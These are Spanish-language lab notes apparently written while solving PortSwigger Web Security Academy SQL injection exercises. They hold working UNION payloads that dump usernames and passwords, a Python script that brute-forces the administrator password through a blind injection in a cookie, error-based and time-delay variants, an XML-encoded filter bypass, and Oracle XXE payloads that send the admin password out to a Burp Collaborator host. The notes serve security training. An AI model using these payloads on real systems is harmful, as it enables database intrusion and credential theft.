## Lab: SQL injection attack, listing the database contents on non-Oracle databases (postgresql)

metiendole `version()` sacamos que es POSTGRESQL, 

vamos a sacarle el nombre de la base de datos actual:

```sql
union select current_database(),NULL-- -
```

y nos reporta que estamos en `academy_labs` 

asi que le sacamos el nombre de las tablas que tiene 
```sql
union select table_name,NULL from information_schema.tables 
```

y sacamos una interesante en particular `users_agteye`  asi que vamos a investigarla:

```sql
 union SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_agteye'-- -
 ```

y tenemos dos columnas: `username y password`, asi que vamos a sacar su informacion de manera concatenada:

```sql
union select username_xbndko||':'||password_yiwwyg,NULL from users_agteye-- -
```

y ya tenemos el username y password.

## Lab: SQL injection attack, listing the database contents on Oracle

Para ver que columnas elementos son inyectables despues de hacer un order by, tenemos que hacer un `from dual` al final de la query.

Asi que vemos como las dos columnas son vulnerables, asi que vamos a sacar el nombre de las tablas:

```sql
union select table_name,NULL from all_tables
```

y tenemos la tabla `USERS_YVJYCB` , asi que vamos a ver que tiene dentro:

```sql
 union SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_YVJYCB'-- -
 ```

y asi sacamos `PASSWORD_FCFOYJ` y `USERNAME_LMKULY` , y finalmente sacamos las credenciales concatenadamete: 

```sql
union select PASSWORD_FCFOYJ||USERNAME_LMKULY,NULL from USERS_YVJYCB-- -
```

## Blind SQL injection with conditional responses

si hacemos `'order by 1-- -` en las cookies, vemos que aparece el mensaje `Welcome Back` asi que sabemos que tenemos una unica tabla. Vamos a ver ante que version de DDBB estamos, y vemos que estamos ante postgresql, pues nos coge `version()`.

Asi que vamos a sacar la contraseña con el siguiente script: 
```python
 #!/usr/bin/python3
 
 from pwn import *
 import requests, signal, time, pdb, sys, string
 
 def def_handler(sig, frame):
     print("\n\n[!] Saliendo...")
     sys.exit(1)
 
 #Ctrl + C
 signal.signal(signal.SIGINT, def_handler)
 
 main_url = "https://0ade001803f6ab4dc04fa88e002700cb.web-security-academy.net"
 dictionary = string.ascii_lowercase + string.digits
 
 def makeRequest():
 
     password = ""
 
     p1 = log.progress("Fuerza bruta")
     p1.status("Iniciando fuerza bruta")
 
     time.sleep(2)
 
     p2 = log.progress("Password")
 
     for i in range(1,21):
         for j in dictionary:
 
             cookies = {
	                 'TrackingId': "g7BmeSpb4aBsVZij' and (select substring(password,%d,1) from users where username='administrator')='%s" % (i, j),
                 'session': 'DPQBXLIZb2iqqatNfLKyDlivPNyNeu9P'
             }
     
             p1.status(cookies['TrackingId'])
 
             r = requests.get(main_url, cookies=cookies)
 
             if "Welcome back!" in r.text:
                 password += j
                 p2.status(password)
                 break
 
 if __name__ == '__main__':
     makeRequest()
```

```python
# A continuación, vamos a explicar brevement que hace el siguiente script: 
def_handler() # Es una funcion que al presionar ctrl+C detiende el programa.
main_url # Es la url que deseamos "atacar"
dictionary # Contiene todos los caracteres y numeros que vamos a usar.
makeRequest() # Es la funcion principal, en la que p1 y p2 son barras de progreso (libreria pwn) a cuales les asignamos un status.

for i in range (1,21) 
	for j in dictionary
# Como sabemos que la pagina tiene una vulnerabilidad dentro del tracking id (cookie), vamos a insertar la sintaxis que nuestro script automatizará: 
and (select substring(password,%d,1) from users where username='administrator')='%s" % (i, j) 
# la %d será sustuido por la i en el rango 1-21 para iterar las posiciones de los caracteres de la contraseña, mientras que %s iterará los caracteres en si. Por lo tanto, si la contraseña de admin es "admin123" y el bucle select tenga password(a,1) entra en bluce añadira dicha letra a la variable
password # Dentro del if
# Y así hasta hallar toda la contraseña. 
# La funcion 
r=requests.get(main_url, cookies=cookies) # Es para "mandar" la cookie a la url que hemos definido antes
```

## Blind SQL injection with conditional errors

con `union union select banner from v$version` sabemos que estamos ante una BBDD Oracle, asi que vamos a sacar la password:

```sql
'||(select case when substr(password, %d, 1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'
```

```python
# En este caso, el script sería identico al anterior, solo que tendríamos que cambiar el tracking ID script por el que acabamos de describir y el if por este:
if r.status_code == 500:
    password += j
    p2.status(password)
    break
# Si la pagina devuelve un 500 error code es que el caracter en la posicion J es correcto, por lo que lo añade a la variable
password
```

### Blind SQL injection with time delays

Comprobando la BBDD que hay detras, sabemos que es postgresql, pues nos coge el siguiente comando:

```sql
'||pg_sleep(10)--
```

#### Blind SQL injection with time delays and information retrieval

Sabemos una vez mas que estamos andre un postgresql, pues nos coge el comando `pg_sleep(5)--` asi que ahora toca crear el comando para iterar las contraseñas:

```sql
||(SELECT CASE WHEN substring(password,%d,1)='%s' then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -
```

```python
# Una vez más modificamos el trackingId y la variable if:
cookies = {
    'TrackingId': "FMbisLX5v6aPM6Gb'||(SELECT CASE WHEN substring(password,%d,1)='%s' then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -" % (i, j),
    'session': 'ojpZLXsnFHObkno02UsBT5VE1DLsR4PG'
}
if time_end - time_start > 3:
    password += j
    p2.status(password)
    break

# En este caso, la pagina tardará X segundos en responder si la query que le mandamos es correcta, asi que vamos a iterar una vez más la contraseña del usuario administrator dentro de la BBDD y guardarla en la variable 
password
# No obstante, hay dos variables:
time_end & time_start
# Estas las usamos para medir el tiempo en X momento de la ejecución del programa, por lo que hemos de definir estas variables en dos momentos diferentes del programa. 
```

## Exploiting blind SQL injection using out-of-band (OAST) techniques

Como sabemos que el trackingID es vulnerable, vamos a interceptarlo con burpsuite y modificarlo:

```sql
trackingId=x'(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)-- -
```

```sql
-- Este comando lo hemos sacado del cheatsheet que portswigger nos proporciona, y ahora lo unico que nos queda es modificar el apartado de BURP-COLLABORATOR-SUBDOMAIN y URL-Encodear la cookie, quedándonos de esta manera:
trackingId=x'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//bbqdd9nvupvm1cfshjcw6evlnctfh4.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--+-
```

## Blind SQL injection with out-of-band data exfiltration

Este caso es muy parecido al anterior. No obstante, además de hacer un DNS LookUp tenemos la posibilidad de introducir querys. Una vez mas, cojamos el comando del cheatsheet de portswigger:

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
-- Este comando es para oracle, pues sabemos que este es el gestor que está detrás de la BBDD. Si fuese Microsoft, PostgreSQL o MySQL, deberiamos ejecutar otro comando. 
```

```sql
-- Como vemos, tenemos la posiblidad de agregar un comando al DNS LookUp, y como nos interesa saber la contraseña del usuario administrador:
select password from users where username = 'administrator'
-- junto a nuestra dirección de burp collaborator: 
lshnuj45bzcwimw2ytt6nocv4maqyf.oastify.com
-- nuestra query quedaría de la siguiente manera:
||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.lshnuj45bzcwimw2ytt6nocv4maqyf.oastify.com/"> %remote;]>'),'/l') FROM dual )-- -
-- Finalmente UrlEncodeamos la petición, y si miramos la petición recibida en el collaborator, tenemos la siguiente peticion:
The Collaborator server received a DNS lookup of type AAAA for the domain name fetvkct55u3ifrfqsh3k.lshnuj45bzcwimw2ytt6nocv4maqyf.oastify.com.

--Donde fetvkct55u3ifrfqsh3k es la respuesta a la petición que hemos hecho (password del administrador)
```

## SQL injection with filter bypass via XML encoding

Este tipo de SQL injections afecta a la esctructura XML de la pagina, y como sabemos que la sección de stock es vulnerable, vamos a interceptarla con burpsuite:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
	2
	</productId>
	<storeId>
	1
	</storeId>
</stockCheck>
```

```sql
-- No obstante, cualquier SQL que le metamos al productID o StoreID no será util, ya que la pagina detectará el ataque y lo bloqueará. 

-- Esto sucede porque la SQL no sigue el patrón XML de la pagina. Para ello, tenemos que Encodearlo para que si lo siga. Gracias a la herramienta hackvector, podemos hacerlo facilmente. 

-- Como lo que nos interesa es la contraseña del usuario administrator, tenemos que introducir la siguiente sintaxis despues del productId o storeID:
2 union select password from users where username = 'administrator'-- -

-- y encodearlo en formato hex_entities usando hackvector:
-- Seleccionamos la sintaxis > click derecho > Extensions > hackvector > encode > hex_entities, por lo que nos quedará de la siguiente manera:
```

```xml
<stockCheck>
	<productId>
	<@hex_entities>
	2 union select password from users where username 
	= 'administrator'-- -
	<@/hex_entities>
	</productId>
	<storeId>
	1
	</storeId>
</stockCheck>
```

```shell
# y burpsuite nos reportará lo siguiente:
HTTP/1.1 200 OK

Content-Type: text/plain; charset=utf-8

Connection: close

Content-Length: 50
180 units
473 units
4k711fervgxx88cdbrt4
845 units

# Y ya podriamos logearnos dentro de la cuenta del administrator.
```



